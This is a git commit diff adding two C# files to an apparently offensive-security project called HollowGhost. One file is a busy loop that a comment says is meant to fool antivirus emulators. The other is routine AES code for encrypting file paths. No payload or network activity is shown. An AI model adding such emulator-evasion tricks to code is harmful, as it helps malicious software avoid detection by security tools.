61ceaeca1391fdebe811a73eddb1ea3c26eff33f
Logan Elliott <contact@loganelliottinfosec.com>
2023-10-07 21:30:07 -0500

    Add existing project files

---
+++ HollowGhost/Modules/Evasion/Evasion.cs
@@ -0,0 +1,20 @@
+﻿namespace HollowGhost.Modules.Evasion
+{
+    internal class Evasion
+    {
+        // Perform for loop 900 million times, this is not a lot for a modern CPU but is enough to trick up an emulator, continue execution flow after complete
+        public static void MI()
+        {
+            int count = 0;
+            int max = 900000000;
+            for (int i = 0; i < max; i++)
+            {
+                count++;
+            }
+            if (count == max)
+            {
+                return;
+            }
+        }
+    }
+}
---
+++ HollowGhostEncPath/Modules/Crypt/FilepathEncryptor.cs
@@ -0,0 +1,73 @@
+﻿using System;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace HollowGhostEncPath.Modules.Crypt
+{
+    public class FilepathEncryptor
+    {
+        public static string GenerateRandomKey(int keySize)
+        {
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                byte[] keyBytes = new byte[keySize];
+                rng.GetBytes(keyBytes);
+                return Convert.ToBase64String(keyBytes);
+            }
+        }
+
+        public static string GenerateRandomIV()
+        {
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.GenerateIV();
+                return Convert.ToBase64String(aesAlg.IV);
+            }
+        }
+
+        public static string Encrypt(string plainText, string key, string iv)
+        {
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Convert.FromBase64String(key);
+                aesAlg.IV = Convert.FromBase64String(iv);
+
+                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msEncrypt = new MemoryStream())
+                {
+                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                        {
+                            swEncrypt.Write(plainText);
+                        }
+                    }
+                    return Convert.ToBase64String(msEncrypt.ToArray());
+                }
+            }
+        }
+
+        public static string Decrypt(string cipherText, string key, string iv)
+        {
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Convert.FromBase64String(key);
+                aesAlg.IV = Convert.FromBase64String(iv);
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+                            return srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
